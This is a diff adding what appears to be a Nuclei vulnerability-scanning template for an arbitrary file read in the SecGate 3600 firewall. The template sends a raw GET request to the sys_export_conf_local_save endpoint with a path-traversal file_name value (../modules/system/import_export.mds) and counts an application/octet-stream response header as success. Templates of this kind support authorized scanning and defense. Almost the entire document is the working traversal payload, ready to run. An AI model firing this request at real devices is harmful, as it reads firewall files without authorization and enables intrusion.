@@ -1,0 +1,20 @@
+id: secgate3600-obj-area-export-save-fileread
+
+info:
+  name: 网神SecGate 3600 防火墙 obj_area_export_save 任意文件读取
+  author: Observer
+  severity: high
+http:
+  - raw:
+      - |+
+        GET /?g=sys_export_conf_local_save&file_name=../modules/system/import_export.mds HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - 'application/octet-stream'
